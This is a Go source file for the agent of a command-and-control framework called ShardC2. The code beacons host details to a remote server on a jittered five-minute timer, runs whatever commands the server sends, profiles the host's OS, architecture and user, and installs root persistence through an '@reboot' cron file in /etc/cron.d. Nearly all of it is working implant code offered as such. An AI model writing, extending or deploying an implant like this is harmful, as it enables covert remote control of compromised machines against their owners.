package agent

import (
	"bytes"
	"context"
	"encoding/json"
	"fmt"
	"log"
	"math/rand"
	"net/http"
	"os"
	"os/exec"
	"runtime"
	"strings"
	"time"
)

const (
	BeaconTimeout  = 10 * time.Second
	CommandTimeout = 30 * time.Second
	BeaconInterval = 300 * time.Second
	MaxOutputSize  = 10 * 1024 * 1024 // 10MB
)

// Agent represents a ShardC2 bot agent
type Agent struct {
	ServerURL string
	BotID     string
}

// New creates a new agent instance
func New(serverURL string) *Agent {
	rand.Seed(time.Now().UnixNano())
	return &Agent{ServerURL: serverURL}
}

type BeaconData struct {
	BotID    string `json:"bot_id"`
	Hostname string `json:"hostname"`
	OS       string `json:"os"`
}

type SystemProfile struct {
	Hostname string `json:"hostname"`
	OS       string `json:"os"`
	Arch     string `json:"arch"`
	User     string `json:"user"`
}

func (a *Agent) Beacon() error {
	hostname, err := os.Hostname()
	if err != nil {
		log.Printf("Failed to get hostname: %v", err)
		hostname = "unknown"
	}
	data := BeaconData{
		BotID:    a.BotID,
		Hostname: hostname,
		OS:       runtime.GOOS,
	}
	jsonData, err := json.Marshal(data)
	if err != nil {
		log.Printf("Failed to marshal beacon data: %v", err)
		return err
	}
	ctx, cancel := context.WithTimeout(context.Background(), BeaconTimeout)
	defer cancel()
	req, err := http.NewRequestWithContext(ctx, "POST", a.ServerURL+"/beacon", bytes.NewBuffer(jsonData))
	if err != nil {
		log.Printf("Failed to create request: %v", err)
		return err
	}
	req.Header.Set("Content-Type", "application/json")
	resp, err := http.DefaultClient.Do(req)
	if err != nil {
		log.Printf("Beacon request failed: %v", err)
		return err
	}
	defer resp.Body.Close()
	if resp.StatusCode >= 200 && resp.StatusCode < 300 {
		log.Printf("Beacon sent successfully")
		return nil
	} else {
		return fmt.Errorf("beacon failed with status %d", resp.StatusCode)
	}
}

func (a *Agent) StartBeaconing() {
	for {
		err := a.Beacon()
		if err != nil {
			log.Printf("Beacon failed: %v", err)
			// Continue beaconing despite errors
		}
		jitter := time.Duration(rand.Intn(60)) * time.Second // 0-60s jitter
		time.Sleep(BeaconInterval + jitter)                  // beacon every 5min + jitter
	}
}

func (a *Agent) ExecuteCommand(cmd string) (string, error) {
	args := strings.Fields(cmd)
	if len(args) == 0 {
		return "", fmt.Errorf("empty command")
	}
	ctx, cancel := context.WithTimeout(context.Background(), CommandTimeout)
	defer cancel()
	command := exec.CommandContext(ctx, args[0], args[1:]...)
	out, err := command.CombinedOutput()
	if len(out) > MaxOutputSize {
		out = out[:MaxOutputSize]
	}
	return string(out), err
}

func (a *Agent) ProfileSystem() (*SystemProfile, error) {
	hostname, err := os.Hostname()
	if err != nil {
		return nil, fmt.Errorf("failed to get hostname: %w", err)
	}
	user := os.Getenv("USER")
	if user == "" {
		user = "unknown"
	}
	return &SystemProfile{
		Hostname: hostname,
		OS:       runtime.GOOS,
		Arch:     runtime.GOARCH,
		User:     user,
	}, nil
}

func (a *Agent) InstallPersistence(cronDir string) error {
	isProduction := cronDir == "" || cronDir == "/etc/cron.d"
	if cronDir == "" {
		cronDir = "/etc/cron.d"
	}

	if isProduction {
		// Check platform
		if runtime.GOOS != "linux" {
			return fmt.Errorf("persistence only supported on Linux")
		}

		// Check root privileges
		if os.Getuid() != 0 {
			return fmt.Errorf("persistence requires root privileges")
		}
	}

	// Get absolute executable path
	execPath, err := os.Executable()
	if err != nil {
		return fmt.Errorf("failed to get executable path: %w", err)
	}

	// Create cron entry
	cronPath := cronDir + "/shardc2"
	cronEntry := fmt.Sprintf("@reboot root %s --daemon\n", execPath)

	// Check if file exists
	if _, err := os.Stat(cronPath); err == nil {
		log.Printf("Warning: cron file %s already exists, overwriting", cronPath)
	} else if !os.IsNotExist(err) {
		return fmt.Errorf("failed to check cron file: %w", err)
	}

	// Write the cron file
	err = os.WriteFile(cronPath, []byte(cronEntry), 0644)
	if err != nil {
		return fmt.Errorf("failed to write cron file: %w", err)
	}

	log.Printf("Persistence installed successfully: %s", cronPath)
	return nil
}
